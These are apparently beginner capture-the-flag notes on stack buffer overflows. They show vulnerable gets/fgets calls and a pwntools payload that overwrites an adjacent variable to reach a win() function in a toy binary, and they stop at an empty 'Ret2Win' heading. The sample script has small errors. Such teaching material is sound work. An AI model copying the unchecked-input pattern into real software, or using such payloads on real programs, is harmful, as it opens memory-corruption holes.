# Stack Overflow
## Identification
We can know there is buffer or stack overflow vulnerabilities when a input function without limit or the limit is exceed the buffer capacity. 
Example:
```
   char buff[50]
   gets(buff)     // gets function will take input without limit until reach null terminator
```

or with limit with `fgets()`
```
    char buff[50]
    fgets(buff, 100, stdin) // fgets take input 100 char but the buffer capacity only 50 char
```

## Exploitation and Vulnerabilities
### Variables Overwrites (idk the real name)
    This one the most simple one. If you can see there is two variables next each other and one of them is the buffer and the other will compared later. 
    The example of the source code are like this
    ```
        int cmp;
        char buff[20];
        gets(buff);
        if(cmp == 0xCAFEF00D)
        {
            win();
        }
    ```
    You can see on that code. We need to change the cmp value to `0xCAFEF00D` so that we can call win function. We can send it using python code with `pwntools` module or we can inject it with pipe directly.
    We know the buffer capacity is 20, then we need fill the buffer first then input desired value for the `cmp`.
    so the payload will go like this
    `b'AAAAAAAAAAAAAAAAAAAA\x0D\xF0\xFE\xCA'`
    the reason for the payload is reversed because the memory stores value with little-endian encoding and the reason for we store it `\x0D` because we input it as char but there is no readable char representation for it so we use byte string to input char based on its hex value.
    Payload
    ```
    p = process('./var')

    payload = b'A' * 20   # Padding
    payload += b'\x0D\xF0\xFE\xCA' # Desired value
    # OR We can use
    payload += p64(0xCAFEF00D) # or p32 for x86 architecture

    p.sendline(payload)
    p.interactve()
    ```
    `p64` or `p32` function is used for convert integer to 8 bytes or 4 bytes little-endian encoding or pack the integer based on system architecture

### Ret2Win

